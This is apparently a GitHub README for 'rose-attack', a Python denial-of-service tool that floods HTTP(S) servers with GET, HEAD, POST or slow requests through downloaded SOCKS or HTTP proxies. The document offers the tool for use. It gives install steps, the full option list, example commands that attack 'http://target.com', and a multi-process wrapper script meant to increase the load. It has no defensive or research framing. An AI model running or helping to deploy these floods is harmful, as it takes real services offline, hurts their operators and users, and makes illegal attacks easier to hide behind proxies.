# whiterose-attack
# rose-attack ![](https://github.com/whiteroseeee/whiterose-attack/blob/main/rose.png?raw=true)
  A script for using socks4/5 or http proxies to attack http(s) server.

 News:
- [x] Added Support of HTTP proxies
- [x] Added More proxies api to download 

 Info:
- [x] Using Python3
- [x] Added more human-like options
- [x] Http Get/Head/Post/Slow Flood
- [x] Random Http Header/Data
- [x] Socks4/5 Proxies Downloader
- [x] Socks4/5 Proxies Checker
- [x] Customize Cookies
- [x] Customize Post Data 
- [x] Support HTTPS
- [x] Support Socks4/5

## Install

    pip3 install requests pysocks
    git clone https://github.com/whiteroseeee/whiterose-attack.git
    cd rose-attack

## Usage

    python3 rose.py <arguments>

```
===============  rose-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================
```
### Some example of the usage
Download socks5 proxies as proxy.txt:
```
python3 rose.py -down -f proxy.txt -v 5
```
Attack a target with custom proxies list(socks4.txt) for 30 seconds :
```
python3 rose.py -url http://target.com -f socks4.txt -v 4 -s 30
```

## Usage of multiproc.sh
```
This script is using for increasing the performance of rose.py.
Due to the suck performance of python since it has a GIL lock,
And I am lazy to make a multiprocess version.
There is a option for linux user to increase their performance of rose.py

This script basicly just run rose.py multiple times to make it "multi-processing"

First, put this script and rose.py in the same folder.

Then prepare the proxies list by yourself or just run "python3 rose.py -down -v 4" (-v socks version)

After that, change the number of process.

At last, change atk_cmd to your command and run the script by "bash multiproc.sh"
```
Example setup of multiproc.sh (-v socks version) (-s attack time)
```
atk_cmd="python3 rose.py -url http://target.com -v 4 -s 60"

#number of process that you want
process=10

```
